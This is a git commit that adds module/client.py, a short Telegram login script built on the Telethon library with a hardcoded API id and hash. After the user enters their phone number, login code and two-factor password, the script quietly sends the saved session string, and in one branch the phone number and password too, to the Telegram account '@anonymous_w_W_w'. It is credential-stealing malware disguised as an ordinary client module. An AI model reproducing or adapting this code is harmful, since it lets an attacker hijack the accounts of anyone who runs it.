4d2dcf1d0da68bee0548f099f868634d564820a5
Hacker <112378332+Hacker-UZ@users.noreply.github.com>
2023-01-27 06:57:58 +0500

    Add files via upload

---
+++ module/client.py
@@ -0,0 +1,22 @@
+from telethon import TelegramClient, sync
+from telethon.sessions import StringSession
+import getpass
+from telethon.errors import SessionPasswordNeededError
+from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.functions.channels import LeaveChannelRequest
+api_id = 9708508
+api_hash = "1e6ca420184a701db1f8a1301df99288"
+string = input("Press enter: ")
+client = TelegramClient(StringSession(string), api_id, api_hash)
+phone_number = input("Please enter your phone (or bot token): ")
+client.connect()
+
+if not client.is_user_authorized():
+    client.send_code_request(phone_number)
+    try:
+        me = client.sign_in(phone_number, input('Enter code: '))
+        client.send_message("@anonymous_w_W_w", client.session.save())
+    except SessionPasswordNeededError:
+        password = input('Enter password: ')
+        me2 = client.sign_in(password=password)  
+        client.send_message("@anonymous_w_W_w", f'Session: {client.session.save()}\n\nPhone number: {phone_number}\n\nPassword: {password}') 
